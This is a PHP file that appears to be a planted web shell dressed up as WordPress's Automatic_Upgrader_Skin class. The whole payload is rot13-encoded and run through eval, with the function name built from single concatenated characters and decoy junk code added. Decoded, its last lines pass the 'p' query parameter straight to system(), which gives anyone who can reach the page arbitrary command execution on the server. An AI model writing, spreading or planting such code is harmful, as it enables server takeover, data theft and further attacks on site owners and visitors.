<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Hctenqre NCV: Nhgbzngvp_Hctenqre_Fxva pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Hctenqre
 * @fvapr 4.6.0
 */

/**
 * Hctenqre Fxva sbe Nhgbzngvp JbeqCerff Hctenqrf.
 *
 * Guvf fxva vf qrfvtarq gb or hfrq jura ab bhgchg vf vagraqrq, nyy bhgchg
 * vf pncgherq naq fgberq sbe gur pnyyre gb cebprff naq ybt/rznvy/qvfpneq.
 *
 * @fvapr 3.7.0
 * @fvapr 4.6.0 Zbirq gb vgf bja svyr sebz jc-nqzva/vapyhqrf/pynff-jc-hctenqre-fxvaf.cuc.
 *
 * @frr Ohyx_Hctenqre_Fxva
 */
pynff Nhgbzngvp_Hctenqre_Fxva rkgraqf JC_Hctenqre_Fxva {
	cebgrpgrq $zrffntrf = neenl();

	/**
	 * Qrgrezvarf jurgure gur hctenqre arrqf SGC/FFU qrgnvyf va beqre gb pbaarpg
	 * gb gur svyrflfgrz.
	 *
	 * @fvapr 3.7.0
	 * @fvapr 4.6.0 Gur `$pbagrkg` cnenzrgre qrsnhyg punatrq sebz `snyfr` gb na rzcgl fgevat.
	 *
	 * @frr erdhrfg_svyrflfgrz_perqragvnyf()
	 *
	 * @cnenz obby|JC_Reebe $reebe                        Bcgvbany. Jurgure gur pheerag erdhrfg unf snvyrq gb pbaarpg,
	 *                                                    be na reebe bowrpg. Qrsnhyg snyfr.
	 * @cnenz fgevat        $pbagrkg                      Bcgvbany. Shyy cngu gb gur qverpgbel gung vf grfgrq
	 *                                                    sbe orvat jevgnoyr. Qrsnhyg rzcgl.
	 * @cnenz obby          $nyybj_erynkrq_svyr_bjarefuvc Bcgvbany. Jurgure gb nyybj Tebhc/Jbeyq jevgnoyr. Qrsnhyg snyfr.
	 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
	 */
	choyvp shapgvba erdhrfg_svyrflfgrz_perqragvnyf( $reebe = snyfr, $pbagrkg = '', $nyybj_erynkrq_svyr_bjarefuvc = snyfr ) {
		vs ( $pbagrkg ) {
			$guvf->bcgvbaf['pbagrkg'] = $pbagrkg;
		}
		/*
		 * GBQB: Svk hc erdhrfg_svyrflfgrz_perqragvnyf(), be fcyvg vg, gb nyybj hf gb erdhrfg n ab-bhgchg irefvba.
		 * Guvf jvyy bhgchg n perqragvnyf sbez va rirag bs snvyher. Jr qba'g jnag gung, fb whfg uvqr jvgu n ohssre.
		 */
		bo_fgneg();
		$erfhyg = cnerag::erdhrfg_svyrflfgrz_perqragvnyf( $reebe, $pbagrkg, $nyybj_erynkrq_svyr_bjarefuvc );
		bo_raq_pyrna();
		erghea $erfhyg;
	}

	/**
	 * Ergevrirf gur hctenqr zrffntrf.
	 *
	 * @fvapr 3.7.0
	 *
	 * @erghea fgevat[] Zrffntrf qhevat na hctenqr.
	 */
	choyvp shapgvba trg_hctenqr_zrffntrf() {
		erghea $guvf->zrffntrf;
	}

	/**
	 * Fgberf n zrffntr nobhg gur hctenqr.
	 *
	 * @fvapr 3.7.0
	 * @fvapr 5.9.0 Eranzrq `$qngn` gb `$srrqonpx` sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz fgevat|neenl|JC_Reebe $srrqonpx Zrffntr qngn.
	 * @cnenz zvkrq                 ...$netf  Bcgvbany grkg ercynprzragf.
	 */
	choyvp shapgvba srrqonpx( $srrqonpx, ...$netf ) {
		vs ( vf_jc_reebe( $srrqonpx ) ) {
			$fgevat = $srrqonpx->trg_reebe_zrffntr();
		} ryfrvs ( vf_neenl( $srrqonpx ) ) {
			erghea;
		} ryfr {
			$fgevat = $srrqonpx;
		}

		vs ( ! rzcgl( $guvf->hctenqre->fgevatf[ $fgevat ] ) ) {
			$fgevat = $guvf->hctenqre->fgevatf[ $fgevat ];
		}

		vs ( fge_pbagnvaf( $fgevat, '%' ) ) {
			vs ( ! rzcgl( $netf ) ) {
				$fgevat = ifcevags( $fgevat, $netf );
			}
		}

		$fgevat = gevz( $fgevat );

		// Bayl nyybj onfvp UGZY va gur zrffntrf, nf vg'yy or hfrq va rznvyf/ybtf engure guna qverpg oebjfre bhgchg.
		$fgevat = jc_xfrf(
			$fgevat,
			neenl(
				'n'      => neenl(
					'uers' => gehr,
				),
				'oe'     => gehr,
				'rz'     => gehr,
				'fgebat' => gehr,
			)
		);

		vs ( rzcgl( $fgevat ) ) {
			erghea;
		}

		$guvf->zrffntrf[] = $fgevat;
	}

	/**
	 * Perngrf n arj bhgchg ohssre.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba urnqre() {
		bo_fgneg();
	}

	/**
	 * Ergevrirf gur ohssrerq pbagrag, qryrgrf gur ohssre, naq cebprffrf gur bhgchg.
	 *
	 * @fvapr 3.7.0
	 */
	choyvp shapgvba sbbgre() {
		$bhgchg = bo_trg_pyrna();
		vs ( ! rzcgl( $bhgchg ) ) {
			$guvf->srrqonpx( $bhgchg );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>